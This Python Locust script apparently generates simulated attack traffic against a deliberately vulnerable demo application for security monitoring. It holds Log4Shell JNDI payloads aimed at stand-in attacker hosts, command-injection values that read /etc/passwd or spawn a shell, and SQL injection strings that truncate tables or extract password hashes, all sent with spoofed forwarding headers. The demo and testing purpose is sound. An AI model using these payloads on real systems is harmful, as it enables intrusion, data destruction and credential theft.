#
# Copyright 2023 Dynatrace LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

import os
import random
import time

from locust import HttpUser, between, task

LOCATION_BASED_IPS = ['177.236.37.155',
                      '49.210.236.225',
                      '66.96.37.30',
                      '19.21.221.83',
                      '134.110.48.221',
                      '87.130.41.167',
                      '159.104.0.163',
                      '91.21.66.164',
                      '217.69.107.8',
                      '204.176.161.159',
                      '18.153.60.55',
                      '96.16.70.23',
                      '171.72.188.229',
                      '24.253.46.199',
                      '122.62.252.49',
                      '48.130.188.78',
                      '168.172.80.223',
                      '107.60.18.49',
                      '7.255.47.168',
                      '147.99.166.57',
                      '102.99.216.105',
                      '161.210.123.218',
                      '35.183.42.70',
                      '51.229.182.255',
                      '159.3.105.62',
                      '35.102.238.6',
                      '32.221.32.66',
                      '92.111.134.241',
                      '106.203.123.108',
                      '81.223.64.234',
                      '172.175.183.17',
                      '175.127.203.9',
                      '42.61.224.189',
                      '79.236.195.22',
                      '182.7.180.66',
                      '184.195.3.131',
                      '141.70.56.232',
                      '104.9.77.242',
                      '126.47.188.82',
                      '211.40.123.204',
                      '177.116.53.144',
                      '129.94.14.10',
                      '183.66.217.182',
                      '50.164.50.137',
                      '101.58.202.167',
                      '195.86.230.231',
                      '119.241.63.127',
                      '151.42.34.115',
                      '102.46.70.77',
                      '120.21.221.110',
                      '212.102.231.31',
                      '194.132.161.92',
                      '62.179.239.135',
                      '113.167.100.35']

USER_INDEX = 0

JNDI_URIS = [
    "${jndi:ldap://cdb16160-beae-4ddd-b3d6-6b25b360f51b.dns.log4shell.tools:12345/cdb16160-beae-4ddd-b3d6-6b25b360f51b}",
    "${jndi:ldap://attacker-server.net:6789/ExploitPayload}",
    "${jndi:ldap://attacker-server.net:5555/Expoit}",
    "${jndi:ldap://evil-server.net:999/CompromiseMachine}",
    "${jndi:ldap://evil-server.net:1111/MineBitcoin}",
    "${jndi:ldap://malicious-server.net:1221/X}"
]

CMDS = [
    "example.com && whoami #",
    "image.com ; /bin/sh echo bar",
    "example-image.net ; `cat /etc/passwd`",
    "; `cat /etc/passwd`",
    "some-nice-pic.net && pwd"
]

SQL_CMDS_BIO = [
    "' WHERE 1 = 0; UPDATE bio SET bio_text = 'hacked' WHERE 1 = 1; --",
    "' WHERE 1 = 0; TRUNCATE TABLE bio; --",
    "' WHERE 1 = 0; INSERT INTO bio (user_id, bio_text) VALUES (500, 'injected'); --",
    "' WHERE 1 = 0; DELETE FROM bio WHERE user_id >= 0; --"
]

SQL_CMDS_MEMBERSHIP = [
    'HACKEDPRO") ON DUPLICATE KEY UPDATE membership="HACKEDPRO"; UPDATE membership SET membership = "hacked" '
    'WHERE 1 = 1 -- ',
    'HACKEDPRO") ON DUPLICATE KEY UPDATE membership="HACKEDPRO"; TRUNCATE TABLE membership; -- ',
]

SQL_CMDS_USERNAME = [
    "' UNION SELECT id+1000, username, password_hash FROM users;--",
    "' and 1 = 0 UNION SELECT VARIABLE_NAME, VARIABLE_NAME, GLOBAL_VALUE FROM INFORMATION_SCHEMA.SYSTEM_VARIABLES;--",
    "' and 1 = 0 UNION SELECT TABLE_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES;--"
]

WAIT_TIME = int(os.environ['WAIT_TIME'])

class UnguardUser(HttpUser):
    wait_time = between(WAIT_TIME, WAIT_TIME + 20)

    def get_running_username(self):
        global USER_INDEX
        USER_INDEX += 1
        return "hacker_" + str(USER_INDEX)

    def get_random_x_forwarded_for_header(self):
        return {
            'x-forwarded-for': random.choice(LOCATION_BASED_IPS)
        }

    @task()
    def post_jndi(self):
        jndi_post = {'header': "en-US",
                     'urlmessage': random.choice(JNDI_URIS)}

        self.client.post("/post", data=jndi_post, headers=self.get_random_x_forwarded_for_header())
        time.sleep(1)

    @task()
    def post_cmd(self):
        cmd_post = {'imgurl': random.choice(CMDS)}

        self.client.post("/post", data=cmd_post, headers=self.get_random_x_forwarded_for_header())
        time.sleep(1)

    @task()
    def post_sql_java(self):
        sql_bio = {'bioText': random.choice(SQL_CMDS_BIO)}

        # post a bio to make sure a bio for this user exists already and an UPDATE statement is used on the server side
        self.client.post("/bio/" + self.get_running_username(), data={'bioText': ''})

        # post the malicious SQL command
        self.client.post("/bio/" + self.get_running_username(), data=sql_bio, headers=self.get_random_x_forwarded_for_header())
        time.sleep(1)

    @task()
    def post_sql_dotnet(self):
        sql_membership = {'membershipText': random.choice(SQL_CMDS_MEMBERSHIP)}

        # post the malicious SQL command
        self.client.post("/membership/" + self.get_running_username(), data=sql_membership, headers=self.get_random_x_forwarded_for_header())
        time.sleep(1)

    @task()
    def get_sql_golang(self):
        sql_username = {'name': random.choice(SQL_CMDS_USERNAME)}

        # get with the malicious SQL command
        self.client.get("/users", params=sql_username, headers=self.get_random_x_forwarded_for_header())
        time.sleep(1)

    @task()
    def post_sql_php(self):
        post_id = 1
        user_id = 1

        # try to remove the like of the admanger account (user ID 1) on the first post (post ID 1).
        self.client.get("/unlike", params={'postId': [post_id, user_id]}, headers=self.get_random_x_forwarded_for_header())
        time.sleep(1)

    def on_start(self):
        curr_user = self.get_running_username()
        # super secure passwords :)
        user_data = {"username": curr_user, "password": curr_user}
        cookie_set = False
        while not cookie_set:
            self.client.post("/register", data=user_data)
            self.client.post("/login", data=user_data)
            cookie_set = self.client.cookies.get('jwt') is not None
            if not cookie_set:
                # wait a bit for deployments to stabilize
                # so we can retry logging in
                time.sleep(5)
